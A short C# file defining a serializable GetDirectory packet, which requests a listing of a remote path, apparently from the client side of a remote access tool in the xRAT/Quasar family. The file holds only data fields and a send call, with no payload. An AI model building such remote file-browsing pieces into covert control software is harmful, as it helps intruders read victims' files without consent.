using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    public enum InformationDetail
    {
        Simple,
        Standard
    }

    [Serializable]
    public class GetDirectory : IPacket
    {
        public string RemotePath { get; set; }
        public InformationDetail Detail { get; set; }

        public GetDirectory()
        {
        }

        public GetDirectory(string remotepath, InformationDetail detail)
        {
            this.RemotePath = remotepath;
            this.Detail = detail;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}